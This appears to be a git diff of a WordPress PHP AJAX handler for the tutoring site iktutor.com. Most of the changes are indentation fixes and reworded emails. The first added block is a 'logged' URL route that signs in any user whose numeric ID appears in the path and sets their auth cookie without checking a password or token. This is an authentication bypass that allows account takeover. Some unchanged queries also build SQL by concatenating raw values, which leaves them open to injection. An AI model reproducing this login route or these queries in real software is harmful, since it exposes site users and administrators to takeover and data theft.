@@ -1,5 +1,16 @@
 <?php
 $route = get_route();
+if(isset($route[1]) && $route[1] == 'logged'){
+    $userid = isset($route[2])?$route[2]:'';
+    $session_id = isset($route[3])?$route[3]:'';
+    $user = get_user_by('ID', $userid);
+    $userLogin = $user->user_login;
+    wp_set_current_user($userid, $userLogin);
+    wp_set_auth_cookie($userid);
+    do_action('wp_login', $userid);
+    wp_redirect( 'https://iktutor.com/en');
+    exit();
+} 
 
 // make sure any ajax call to this script receive status 200
 header('HTTP/1.1 200 OK');
@@ -19,6 +30,18 @@ if (isset($route[2])) {
 /*
  * ajax search for dictionary
  */
+if($task == "status_login_2"){
+    $status_login_2 = get_user_meta($user->ID, 'status_login_2', true);
+    $status_login_2 = $_REQUEST['status_login_2'];
+    $current_user = wp_get_current_user();
+    update_user_meta($current_user->ID, 'status_login_2', '0');
+
+}
+if ($task == "get_status_login") {
+    $current_user = wp_get_current_user();
+    $status_login = get_user_meta($current_user->ID, 'status_login', true);
+    echo $status_login;
+}
 if ($task == 'dictionary') {
     $d = $_GET['d'];
     $dict_table = get_dictionary_table($d);
@@ -162,10 +185,10 @@ if ($task == 'question') {
     if (isset($_GET['hid']) && is_numeric($_GET['hid'])) {
         $sheet = $wpdb->get_row($wpdb->prepare(
                         'SELECT s.*, hs.id AS result_id, finished_question
-				FROM ' . $wpdb->prefix . 'dict_homeworks AS h
-				JOIN ' . $wpdb->prefix . 'dict_sheets AS s ON s.id = h.sheet_id
-				LEFT JOIN ' . $wpdb->prefix . 'dict_homework_results AS hs ON hs.homework_id = h.id
-				WHERE h.id = %d AND (userid = %d OR userid IS NULL)', $_GET['hid'], $current_user_id
+                FROM ' . $wpdb->prefix . 'dict_homeworks AS h
+                JOIN ' . $wpdb->prefix . 'dict_sheets AS s ON s.id = h.sheet_id
+                LEFT JOIN ' . $wpdb->prefix . 'dict_homework_results AS hs ON hs.homework_id = h.id
+                WHERE h.id = %d AND (userid = %d OR userid IS NULL)', $_GET['hid'], $current_user_id
         ));
 
         if (is_null($sheet->result_id)) {
@@ -179,9 +202,9 @@ if ($task == 'question') {
     if (isset($_GET['sid']) && is_numeric($_GET['sid'])) {
         $sheet = $wpdb->get_row($wpdb->prepare(
                         'SELECT s.*, p.id AS pid, p.answers AS practice_answers
-				FROM ' . $wpdb->prefix . 'dict_sheets AS s
-				LEFT JOIN ' . $wpdb->prefix . 'dict_practice_results AS p ON p.sheet_id = s.id AND p.user_id = ' . $current_user_id . '
-				WHERE s.id = %s', $_GET['sid']
+                FROM ' . $wpdb->prefix . 'dict_sheets AS s
+                LEFT JOIN ' . $wpdb->prefix . 'dict_practice_results AS p ON p.sheet_id = s.id AND p.user_id = ' . $current_user_id . '
+                WHERE s.id = %s', $_GET['sid']
         ));
     }
 
@@ -199,8 +222,8 @@ if ($task == 'question') {
 
         $results = $wpdb->get_results(
                 'SELECT id, entry, sound, sound_url, definition 
-				FROM ' . $wpdb->prefix . $dict_table . ' 
-				WHERE entry IN (' . implode(',', $insql) . ')'
+                FROM ' . $wpdb->prefix . $dict_table . ' 
+                WHERE entry IN (' . implode(',', $insql) . ')'
         );
 
         foreach ($results as $item) {
@@ -397,8 +420,8 @@ if ($task == 'homework') {
         } else {
             $result_sheet = $wpdb->get_row($wpdb->prepare(
                             'SELECT answers, correct_answers_count, score 
-					FROM ' . $wpdb->prefix . 'dict_homework_results 
-					WHERE id = %d', $rid
+                    FROM ' . $wpdb->prefix . 'dict_homework_results 
+                    WHERE id = %d', $rid
             ));
 
             $answers = json_decode($result_sheet->answers, true);
@@ -828,9 +851,9 @@ if ($task == 'validatecredit') {
 
     $code = $wpdb->get_row(
             $wpdb->prepare('SELECT c.*, us.activated_by, COUNT(activated_by) AS activated_times
-							FROM ' . $wpdb->prefix . 'dict_credit_codes AS c
-							LEFT JOIN ' . $wpdb->prefix . 'dict_user_subscription AS us ON us.activation_code_id = c.id
-							WHERE encoded_code = %s', $_POST['c'])
+                            FROM ' . $wpdb->prefix . 'dict_credit_codes AS c
+                            LEFT JOIN ' . $wpdb->prefix . 'dict_user_subscription AS us ON us.activation_code_id = c.id
+                            WHERE encoded_code = %s', $_POST['c'])
     );
 
     if (is_null($code)) {
@@ -988,8 +1011,8 @@ if ($task == 'flashcard') {
             );
         } else {
             $wpdb->query('UPDATE ' . $wpdb->prefix . 'dict_flashcard_userdata 
-							  SET memorized = ' . $value . '
-							  WHERE flashcard_id = ' . $flashcard_id . ' AND user_id = ' . $current_user_id);
+                              SET memorized = ' . $value . '
+                              WHERE flashcard_id = ' . $flashcard_id . ' AND user_id = ' . $current_user_id);
         }
 
         die;
@@ -1109,16 +1132,16 @@ if ($task === 'math_worksheet') {
             }
         }
         $query = 'SELECT ms.id, sheet_name , homework_type_id
-						FROM ' . $wpdb->prefix . 'dict_sheets AS ms
-						JOIN ' . $wpdb->prefix . 'dict_grades AS gr ON gr.id = ms.grade_id
-						JOIN (
-							SELECT id, name AS level_name, parent_id AS level_parent_id 
-							FROM ' . $wpdb->prefix . 'dict_grades WHERE level = 1
-						) AS lgr ON lgr.id = gr.parent_id
-						JOIN (
-							SELECT id, name AS level_category_name 
-							FROM ' . $wpdb->prefix . 'dict_grades WHERE level = 0
-						) AS cgr ON cgr.id = lgr.level_parent_id';
+                        FROM ' . $wpdb->prefix . 'dict_sheets AS ms
+                        JOIN ' . $wpdb->prefix . 'dict_grades AS gr ON gr.id = ms.grade_id
+                        JOIN (
+                            SELECT id, name AS level_name, parent_id AS level_parent_id 
+                            FROM ' . $wpdb->prefix . 'dict_grades WHERE level = 1
+                        ) AS lgr ON lgr.id = gr.parent_id
+                        JOIN (
+                            SELECT id, name AS level_category_name 
+                            FROM ' . $wpdb->prefix . 'dict_grades WHERE level = 0
+                        ) AS cgr ON cgr.id = lgr.level_parent_id';
 
         if (!empty($_GET['cid'])) {
             $cat_id = $_GET['cid'];
@@ -1177,8 +1200,8 @@ if ($task === 'math_worksheet') {
 if ($task === 'worksheet') {
     if ($do === 'get') {
         $query = 'SELECT [columns]
-					  FROM ' . $wpdb->prefix . 'dict_sheets AS s
-					  JOIN ' . $wpdb->prefix . 'dict_grades AS gr ON gr.id = s.grade_id';
+                      FROM ' . $wpdb->prefix . 'dict_sheets AS s
+                      JOIN ' . $wpdb->prefix . 'dict_grades AS gr ON gr.id = s.grade_id';
 
         $columns[] = 's.*, gr.name AS grade';
 
@@ -1244,8 +1267,8 @@ if ($task === 'worksheet') {
 if ($task === 'worksheetmath') {
     if ($do === 'get') {
         $query = 'SELECT [columns]
-					  FROM ' . $wpdb->prefix . 'dict_sheets AS s
-					  JOIN ' . $wpdb->prefix . 'dict_grades AS gr ON gr.id = s.grade_id';
+                      FROM ' . $wpdb->prefix . 'dict_sheets AS s
+                      JOIN ' . $wpdb->prefix . 'dict_grades AS gr ON gr.id = s.grade_id';
 
         $columns[] = 's.*, gr.name AS grade';
 
@@ -1325,7 +1348,7 @@ if ($task == 'status_msg') {
     if ($id != 0) {
         $result = $wpdb->query(
                 'UPDATE ' . $wpdb->prefix . 'dict_private_message_inbox 
-				SET status = 1 WHERE id = ' . $id
+                SET status = 1 WHERE id = ' . $id
         );
     }
     exit;
@@ -1374,7 +1397,7 @@ if ($task == 'chat') {
                 'status' => 0
             );
             $check_exists = $wpdb->get_results('SELECT * FROM ' . $wpdb->prefix . 'dict_chat_session AS dcs 
-												WHERE dcs.sheet_id = ' . esc_sql($_sheet_id) . ' AND dcs.user_id = ' . esc_sql($_user_id) . ' AND dcs.status != 2');
+                                                WHERE dcs.sheet_id = ' . esc_sql($_sheet_id) . ' AND dcs.user_id = ' . esc_sql($_user_id) . ' AND dcs.status != 2');
 
             if (count($check_exists) == 0) {
                 $result = $wpdb->insert($wpdb->prefix . 'dict_chat_session', $data);
@@ -1595,7 +1618,7 @@ if ($task == "update_edit_class") {
         $query .= ' AND id <> ' . esc_sql($group_id);
     }
     $row = $wpdb->get_row($wpdb->prepare('SELECT * FROM ' . $wpdb->prefix . 'dict_groups 
-															WHERE id = %d', $group_id));
+                                                            WHERE id = %d', $group_id));
     $pass = isset($row->password) ? $row->password : "";
     if ($wpdb->query($query) && trim($name) != '') {
         $html .= '<div class="error-message">';
@@ -2248,15 +2271,14 @@ if ($task == "create_account") {
 
         // send confirmation email
         if (is_email($user_email)) {
-            $title = __('Congratulations! You have successfully signed up for iktutor.com', 'iii-dictionary');
-            $message = __('You have successfully signed up for iktutor.com. If you have question or need support, please contact us at support@iktutor.com', 'iii-dictionary') . "\r\n\r\n" .
-                    __('If you have lost the password, please click “Lost password’ button to recover it.', 'iii-dictionary') . "\r\n\r\n" .
-                    __('Now, you can start a tutor offered by various teachers, or you can get online tutoring form your favorite tutor. Go to each section and chose a course or a tutor.', 'iii-dictionary') . "\r\n\r\n\r\n" .
-                    __('Thank you for singing up iktutor.com and I hope you enjoy iktutor.com to satisfy your learning needs.', 'iii-dictionary');
+            $title = __('Your account has been created successfully!', 'iii-dictionary');
+            $message = __('<p style="font-size: 14px; font-family: Lucida Console;">You have successfully signed up for iktutor.com.</p>', 'iii-dictionary') . "\r\n\r\n" .
+                    __('<p style="font-size: 14px; font-family: Lucida Console;">If you have questions or need support, please contact us at support@iktutor.com.</p>', 'iii-dictionary') . "\r\n\r\n" .
+                    __('<p style="font-size: 14px; font-family: Lucida Console;">If you are a student, you can take an online course or get help from a live online tutor.</p>', 'iii-dictionary') . "\r\n\r\n\r\n" .
+                    __('<p style="font-size: 14px; font-family: Lucida Console;">If you are registered as a tutor, you can provide help to students with homework or other subjects. You can earn some income by tutoring or offering an online course.</p>', 'iii-dictionary') . "\r\n\r\n\r\n" .
+                    __('<p style="font-size: 14px; font-family: Lucida Console;">Welcome to the IKtutor community!<p>');
 
-            if ($message && !wp_mail($user_email, wp_specialchars_decode($title), $message)) {
-                
-            }
+            wp_mail($user_email, wp_specialchars_decode($title), $message);
         }
 
         $_SESSION['newuser'] = 1;
@@ -2464,8 +2486,8 @@ if ($task == "credit_code") {
 
         // check to see if user can still add this code
         $result = $wpdb->get_col('SELECT COUNT(*) 
-								  FROM ' . $wpdb->prefix . 'dict_user_subscription
-								  WHERE activation_code_id = ' . $code->id);
+                                  FROM ' . $wpdb->prefix . 'dict_user_subscription
+                                  WHERE activation_code_id = ' . $code->id);
 
         if (!empty($result) && $result[0] >= $code->no_of_students) {
             // max number of activation reached
@@ -2481,7 +2503,7 @@ if ($task == "credit_code") {
         $cur_points += $code->num_points;
         update_user_meta($user->ID, 'user_points', $cur_points);
     }
-    // SAT Preparation		
+    // SAT Preparation      
     else {
         $no_of_months = $code->no_of_months_sat;
     }
@@ -2642,9 +2664,9 @@ if ($task == 'show_eng_tab') {
     if ($cid) { // view a sheet
         $current_sheet = $wpdb->get_row($wpdb->prepare(
                         'SELECT s.*, gr.name AS grade
-					FROM ' . $wpdb->prefix . 'dict_sheets AS s
-					JOIN ' . $wpdb->prefix . 'dict_grades AS gr ON gr.id = s.grade_id
-					WHERE s.id = %s', $cid
+                    FROM ' . $wpdb->prefix . 'dict_sheets AS s
+                    JOIN ' . $wpdb->prefix . 'dict_grades AS gr ON gr.id = s.grade_id
+                    WHERE s.id = %s', $cid
         ));
 
         $data['assignment-id'] = $current_sheet->assignment_id;
@@ -4277,16 +4299,16 @@ if ($task == "login_account") {
     $creds['user_password'] = $user_password;
 
     if(!$error){
-		$users = wp_signon($creds, false);
-		if(is_wp_error($users))
-		{
-			echo __('Your account name or password is wrong. Please try again.', 'iii-dictionary');
-		}else{
-			echo '1';
-		}
-	}else{
-		echo __('Your account is not accessed. Please enter another account.', 'iii-dictionary');
-	}
+        $users = wp_signon($creds, false);
+        if(is_wp_error($users))
+        {
+            echo __('Your account name or password is wrong. Please try again.', 'iii-dictionary');
+        }else{
+            echo '1';
+        }
+    }else{
+        echo __('Your account is not accessed. Please enter another account.', 'iii-dictionary');
+    }
     die;
 }
 if ($task == "forgotpassword") {
@@ -4331,17 +4353,18 @@ if ($task == "forgotpassword") {
         $hashed = time() . ':' . $wp_hasher->HashPassword( $key );
         $wpdb->update( $wpdb->users, array( 'user_activation_key' => $hashed ), array( 'user_login' => $user_login ) );
 
-        $message =  '<p>';
-        $message .= __('You have requested that the password be reset for the following account:', 'iii-dictionary') . " ";
-        $message .= network_home_url() . " ";
-        $message .= sprintf(__('Username: %s', 'iii-dictionary'), $user_login) . " </p><p></p><p>";
-        $message .= __('If this was a mistake, just ignore this email and nothing will happen.', 'iii-dictionary') . " </p><p></p><p>";
-        $message .= __('To reset your password, visit the following address:', 'iii-dictionary') . " </p><p></p><p>";
-        $message .= '' . network_site_url('?key=' . $key . '&login=' . rawurlencode($user_login)) . " </p>";
+        
+        $message .= __('<p style="font-size: 14px; font-family: Lucida Console;">We’ve received a request to reset the password for your account: https://iktutor.com</p>', 'iii-dictionary') . " ";
+        
+        $message .= sprintf(__('<p style="font-size: 14px; font-family: Lucida Console;">Username: %s</p>', 'iii-dictionary'), $user_login) ;
+        
+        $message .= __('<p style="font-size: 14px; font-family: Lucida Console;">To reset your password, visit the following address:</p>', 'iii-dictionary');
+        $message .= '<p style="font-size: 14px; font-family: Lucida Console;">' . network_site_url('?key=' . $key . '&login=' . rawurlencode($user_login)).'</p>' ;
+        $message .= __('<p style="font-size: 14px; font-family: Lucida Console;">If this was a mistake, just ignore this email and nothing will happen.</p>', 'iii-dictionary');
 
         $blogname = wp_specialchars_decode(get_option('blogname'), ENT_QUOTES);
 
-        $title = sprintf( __('[%s] Password Reset', 'iii-dictionary'), $blogname );
+        $title = sprintf( __('You have requested the password change', 'iii-dictionary'), $blogname );
 
         $title = apply_filters( 'retrieve_password_title', $title );
 
@@ -4364,7 +4387,7 @@ if ($task == "newpassword") {
     $rp_key = $_REQUEST['rp_key'];
     $rp_login = $_REQUEST['rp_login'];
     $has_err = false;
-
+    $user_email = $rp_login;
     $user = check_password_reset_key( $rp_key, $rp_login );
     if(!$user || is_wp_error($user)) {
         if($user && $user->get_error_code() === 'expired_key'){
@@ -4385,6 +4408,15 @@ if ($task == "newpassword") {
     if(!$has_err && !empty($pass1)) {
         reset_password($user, $pass1);
         echo '1';
-        die;
+        
+        
+            $title = __('Your Password change has been accepted.', 'iii-dictionary');
+            $message = __('<p style="font-size: 14px; font-family: Lucida Console;">Hi '. $user_email.', your password has been successfully reset.</p>', 'iii-dictionary') . "\r\n\r\n" .
+                    
+                    __('<p style="font-size: 14px; font-family: Lucida Console;">Sincerely, IK Tutor Support!<p>');
+
+            wp_mail($user_email, wp_specialchars_decode($title), $message);
+        
+       die;
     }
 }
